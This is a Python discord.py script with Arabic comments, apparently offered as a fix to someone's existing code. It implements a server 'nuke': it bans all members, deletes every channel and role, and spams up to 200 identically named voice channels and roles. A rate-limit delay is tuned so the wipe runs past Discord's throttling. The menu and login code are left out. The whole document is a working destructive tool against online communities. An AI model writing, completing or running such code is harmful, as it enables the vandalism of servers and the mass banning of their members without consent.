import asyncio
import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit

init()
# ... (تعريف الألوان والـbanner زي ما عندك)

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text): print(text, end=''); return input()

# تُحدّد هنا كم ثانية تنطر بعد كل عملية
RATE_LIMIT_DELAY = 1 / 5  # خمس عمليات في الثانية = تأخير 0.2 ثانية

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(RATE_LIMIT_DELAY)
        except Exception:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
            await asyncio.sleep(RATE_LIMIT_DELAY)
        except Exception:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
            await asyncio.sleep(RATE_LIMIT_DELAY)
        except Exception:
            continue
    return banned

async def create_roles(guild, name):
    created = 0
    # تأكدنا إننا ننشئ لحد 200 رول
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
            await asyncio.sleep(RATE_LIMIT_DELAY)
        except Exception:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
            await asyncio.sleep(RATE_LIMIT_DELAY)
        except Exception:
            continue
    return created

async def nuke_guild(guild, name):
    print(f'{cc.LIGHTRED_EX}Nuke: {cc.LIGHTMAGENTA_EX}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{cc.LIGHTMAGENTA_EX}Banned:{cc.LIGHTBLUE_EX}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{cc.LIGHTMAGENTA_EX}Delete Channels:{cc.LIGHTBLUE_EX}{deleted_channels}')
    deleted_roles = await delete_all_roles(guild)
    print(f'{cc.LIGHTMAGENTA_EX}Delete Roles:{cc.LIGHTBLUE_EX}{deleted_roles}')
    created_channels = await create_voice_channels(guild, name)
    print(f'{cc.LIGHTMAGENTA_EX}Create Voice Channels:{cc.LIGHTBLUE_EX}{created_channels}')
    created_roles = await create_roles(guild, name)
    print(f'{cc.LIGHTMAGENTA_EX}Create Roles:{cc.LIGHTBLUE_EX}{created_roles}')
    print(f'{cc.LIGHTRED_EX}--------------------------------------------\n\n')

# باقي كود الـmenu والـclient.run زي ما عندك، بس خلي نداء nuke_guild يمرر له المتغير name:
#   await nuke_guild(guild, name)
